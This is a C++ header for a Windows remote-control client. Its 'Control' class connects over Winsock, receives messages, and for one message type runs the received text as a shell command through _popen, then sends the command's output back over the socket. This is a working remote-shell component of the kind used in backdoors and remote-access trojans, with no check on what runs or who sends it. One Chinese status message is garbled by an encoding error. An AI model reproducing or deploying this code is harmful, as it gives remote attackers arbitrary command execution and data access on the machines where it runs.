#pragma once
#pragma warning(disable:4996)
#include"values.h"
#include"connect.h"
#include"transfer.h"
#include"parsing.h"
#include"ioFile.h"
#include<stdio.h>
#include<synchapi.h>
#include<winsock2.h>
#include<ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

class Control {
public:
	Connect c;
	ioFile file;
	Transfer trans;
	Parsing p;
	SOCKET listenSocket = INVALID_SOCKET;
	AppProtocol *ap;

	Control() { 
		ap = (AppProtocol*)malloc(sizeof(AppProtocol));
		initAP(ap); 
	}

	int connect() {
		int chatFlag = 0;
		c.initConnect();
		listenSocket = c.createConnect();
		if (listenSocket == INVALID_SOCKET) {
			Sleep(1000);
			c.cleanConnect();
			return 1;
		}
		else {
			trans.changeSocket(listenSocket);
			return 0;
		}
		return 0;
	}

	int chat() {
		int pFlag = -1;
		int flag = trans.recvData(ap);
		cout << "recv data: " << ap->data << endl;
		if (flag > 0) {
			pFlag = trans.parProtocol(ap);
		}
		else {
			return 0;
		}

		switch (pFlag)
		{
		case 1:
			exCommand();
			return 1;
		case 4:
			return -1;
		default:
			return 1;
		}
		return 0;
	}

	int exCommand() {
		cout << ap->data << endl;
		string command = (char*)ap->data;
		FILE* result = _popen(command.c_str(), "r");
		if (result == NULL)
			return -1;
		while (fgets((char*)ap->data, BuffSize, result)) {
			cout << "sendBuff: " << ap->data << endl;
			ap->end = 'n';
			trans.sendData(ap);
		}
		ap->end = 'y';
		memset(ap->data, NULL, BuffSize);
		trans.sendData(ap);

		cout << "´«ÊäÍê³É\n";
		return 0;
	}

	int disConnect() {
		c.cleanConnect();
		listenSocket = INVALID_SOCKET;
		return 0;
	}
};
